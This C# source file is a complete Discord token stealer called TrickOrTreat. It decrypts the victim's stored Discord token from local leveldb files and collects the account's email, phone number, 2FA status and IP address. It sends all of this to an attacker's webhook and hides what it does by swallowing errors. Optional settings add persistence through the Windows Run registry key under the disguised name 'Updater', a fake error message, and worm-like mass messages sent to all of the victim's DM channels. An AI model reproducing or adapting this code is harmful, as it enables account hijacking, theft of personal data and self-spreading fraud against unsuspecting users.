using Leaf.xNet;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

/* 
       │ Author       : extatent
       │ Name         : TrickOrTreat
       │ GitHub       : https://github.com/extatent
*/

namespace TrickOrTreat
{
    class Program
    {
        #region Configs
        static string webhook = "https://discord.com/api/webhooks/example/example"; // Enter Discord webhook
        static bool ClassicMode = false; // Sends only the Discord token and IP address in an non-embedded format. (true/false)
        static bool SpreadMode = false; // Sends the file/message to all friends (true/false)
        static string WormMessage = ""; // Enter the message you want the user to spread (the message can include invite links, download urls and so on)
        static bool FakeError = false; // Throws a fake error after opening the program (true/false)
        static bool RunOnStartup = false; // Runs the program once the computer is started (true/false)
        #endregion

        #region Main
        static void Main(string[] args)
        {
            Start();
            if (RunOnStartup == true)
            {
                Startup();
            }
            if (FakeError == true)
            {
                throw new FileNotFoundException("Could not load file or assembly 'Program, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The system cannot find the file specified.");
            }
        }
        #endregion

        #region Start
        static void Start()
        {
            try
            {
                if (ClassicMode == true)
                {
                    Webhook wh = new Webhook(webhook);
                    wh.SendMessage("DT: " + T0ken() + "\nIP: " + I());
                }
                else
                {
                    string id = UserInformation("1");
                    if (string.IsNullOrEmpty(id))
                    {
                        id = "N/A";
                    }
                    string email = UserInformation("3");
                    if (string.IsNullOrEmpty(email))
                    {
                        email = "N/A";
                    }
                    string phonenumber = UserInformation("4");
                    if (string.IsNullOrEmpty(phonenumber))
                    {
                        phonenumber = "N/A";
                    }
                    string bio = UserInformation("5");
                    if (string.IsNullOrEmpty(bio))
                    {
                        bio = "N/A";
                    }
                    string locale = UserInformation("6");
                    if (string.IsNullOrEmpty(locale))
                    {
                        locale = "N/A";
                    }
                    string badges = UserInformation("2");
                    if (string.IsNullOrEmpty(badges))
                    {
                        badges = "N/A";
                    }
                    string nsfwallowed = UserInformation("7");
                    if (string.IsNullOrEmpty(nsfwallowed))
                    {
                        nsfwallowed = "N/A";
                    }
                    string mfaenabled = UserInformation("8");
                    if (string.IsNullOrEmpty(mfaenabled))
                    {
                        mfaenabled = "N/A";
                    }
                    string avatar = UserInformation("9");
                    if (string.IsNullOrEmpty(avatar))
                    {
                        avatar = "N/A";
                    }
                    string theme = UserInformation("10");
                    if (string.IsNullOrEmpty(theme))
                    {
                        theme = "N/A";
                    }
                    string developermode = UserInformation("11");
                    if (string.IsNullOrEmpty(developermode))
                    {
                        developermode = "N/A";
                    }
                    string status = UserInformation("12");
                    if (string.IsNullOrEmpty(status))
                    {
                        status = "N/A";
                    }
                    string nickname = UserInformation("13");
                    if (string.IsNullOrEmpty(nickname))
                    {
                        nickname = "N/A";
                    }

                    DiscordEmbed("New account from " + nickname, "1018364", id, email, phonenumber, bio, locale, badges, nsfwallowed, mfaenabled, theme, developermode, status, avatar, I(), T0ken());
                }

                if (SpreadMode == true)
                {
                    MassDM();
                }
            }
            catch
            { }
        }
        #endregion

        #region User Information
        public static string UserInformation(string number)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", T0ken());
                    HttpResponse userinfo = req.Get($"https://discord.com/api/v10/users/@me");
                    if (number == "1")
                    {
                        var id = JObject.Parse(userinfo.ToString())["id"];
                        return id.ToString();
                    }
                    if (number == "2")
                    {
                        var getbadges = JObject.Parse(userinfo.ToString())["flags"].ToString();
                        string badges = "";
                        if (getbadges == "1")
                        {
                            badges += "Staff, ";
                        }
                        if (getbadges == "2")
                        {
                            badges += "Partner, ";
                        }
                        if (getbadges == "4")
                        {
                            badges += "HypeSquad Events, ";
                        }
                        if (getbadges == "8")
                        {
                            badges += "Bug Hunter Level 1, ";
                        }
                        if (getbadges == "64")
                        {
                            badges += "HypeSquad Bravery, ";
                        }
                        if (getbadges == "128")
                        {
                            badges += "HypeSquad Brilliance, ";
                        }
                        if (getbadges == "256")
                        {
                            badges += "HypeSquad Balance, ";
                        }
                        if (getbadges == "512")
                        {
                            badges += "Early Supporter, ";
                        }
                        if (getbadges == "16384")
                        {
                            badges += "Bug Hunter Level 2, ";
                        }
                        if (getbadges == "131072")
                        {
                            badges += "Verified Bot Developer, ";
                        }
                        return badges;
                    }
                    if (number == "3")
                    {
                        var email = JObject.Parse(userinfo.ToString())["email"];
                        return email.ToString();
                    }

                    if (number == "4")
                    {
                        var phone = JObject.Parse(userinfo.ToString())["phone"];
                        return phone.ToString();
                    }
                    if (number == "5")
                    {
                        var bio = JObject.Parse(userinfo.ToString())["bio"];
                        return bio.ToString();
                    }
                    if (number == "6")
                    {
                        var locale = JObject.Parse(userinfo.ToString())["locale"];
                        return locale.ToString();
                    }
                    if (number == "7")
                    {
                        var nsfw = JObject.Parse(userinfo.ToString())["nsfw_allowed"];
                        return nsfw.ToString();
                    }
                    if (number == "8")
                    {
                        var mfa = JObject.Parse(userinfo.ToString())["mfa_enabled"];
                        return mfa.ToString();
                    }
                    if (number == "9")
                    {
                        var id = JObject.Parse(userinfo.ToString())["id"];
                        var avatarid = JObject.Parse(userinfo.ToString())["avatar"];
                        if (string.IsNullOrEmpty(avatarid.ToString()))
                        {
                            return "N/A";
                        }
                        string avatar = $"https://cdn.discordapp.com/avatars/{id}/{avatarid}.webp";
                        return avatar;
                    }
                    if (number == "13")
                    {
                        var nickname = JObject.Parse(userinfo.ToString())["username"];
                        return nickname.ToString();
                    }
                    req.Close();
                    req.AddHeader("Authorization", T0ken());
                    HttpResponse userinfo2 = req.Get($"https://discord.com/api/v10/users/@me/settings");
                    if (number == "10")
                    {
                        var theme = JObject.Parse(userinfo2.ToString())["theme"];
                        return theme.ToString();
                    }
                    if (number == "11")
                    {
                        var devmode = JObject.Parse(userinfo2.ToString())["developer_mode"];
                        return devmode.ToString();
                    }
                    if (number == "12")
                    {
                        var status = JObject.Parse(userinfo2.ToString())["status"];
                        return status.ToString();
                    }
                    req.Close();
                }
                return "";
            }
            catch { return ""; }
        }
        #endregion

        #region Run on Startup
        static void Startup()
        {
            try
            {
                RegistryKey startup = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                startup.SetValue("Updater", Assembly.GetExecutingAssembly().Location);
            }
            catch
            { }
        }
        #endregion

        #region IP Address
        static string I()
        {
            return new WebClient() { Proxy = null }.DownloadString("http://icanhazip.com/").Trim();
        }
        #endregion

        #region Discord embed
        static void DiscordEmbed(string title, string color, string field1, string field2, string field3, string field4, string field5, string field6, string field7, string field8, string field9, string field10, string field11, string field12, string field13, string field14)
        {
            try
            {
                var wr = WebRequest.Create(webhook);
                wr.ContentType = "application/json";
                wr.Method = "POST";
                using (var sw = new StreamWriter(wr.GetRequestStream()))
                    sw.Write("{\"username\":\"github.com/extatent\",\"embeds\":[{\"title\":\"" + title + "\",\"color\":" + color + ",\"footer\":{\"icon_url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\",\"text\":\"github.com/extatent | TrickOrTreat\"},\"thumbnail\":{\"url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\"},\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Email\",\"value\":\"" + field2 + "\"},{\"name\":\"Phone Number\",\"value\":\"" + field3 + "\"},{\"name\":\"Biography\",\"value\":\"" + field4 + "\"},{\"name\":\"Locale\",\"value\":\"" + field5 + "\"},{\"name\":\"Badges\",\"value\":\"" + field6 + "\"},{\"name\":\"NSFW Allowed\",\"value\":\"" + field7 + "\"},{\"name\":\"2FA Enabled\",\"value\":\"" + field8 + "\"},{\"name\":\"Theme\",\"value\":\"" + field9 + "\"},{\"name\":\"Developer Mode\",\"value\":\"" + field10 + "\"},{\"name\":\"Status\",\"value\":\"" + field11 + "\"},{\"name\":\"Avatar\",\"value\":\"" + field12 + "\"},{\"name\":\"IP\",\"value\":\"" + field13 + "\"},{\"name\":\"DT\",\"value\":\"" + field14 + "\"}]}]}");
                wr.GetResponse();
            }
            catch { }
        }
        #endregion

        #region Mass DM
        static void MassDM()
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", T0ken());
                    HttpResponse r3quest = req.Get($"https://discord.com/api/v10/users/@me/channels");
                    var array = JArray.Parse(r3quest.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", T0ken());
                        client.BaseAddress = new Uri($"https://discord.com/api/v10/channels/{entry.id}/messages");
                        client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                        HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v10/channels/{entry.id}/messages");
                        request.Content = new System.Net.Http.StringContent($"{{\"content\":\"{WormMessage}\"}}", Encoding.UTF8, "application/json");
                        client.SendAsync(request);
                        Thread.Sleep(200);
                    }
                }
            }
            catch { }
        }
        #endregion

        #region Get Token
        static string T0ken()
        {
            string t0ken = "";

            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);

                Match match = EncryptedRegex.Match(contents);
                if (match.Success)
                {
                    t0ken = DecryptT0ken(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                }
            }

            return t0ken;
        }

        static byte[] DecyrptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        static string DecryptT0ken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
        #endregion

        #region Webhook Class
        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new System.Net.Http.StringContent("github.com/extatent"), "username");
                data.Add(new System.Net.Http.StringContent(content), "content");
                var resp = Client.PostAsync(Url, data).Result;
                return resp.StatusCode == System.Net.HttpStatusCode.NoContent;
            }
        }
        #endregion
    }
}
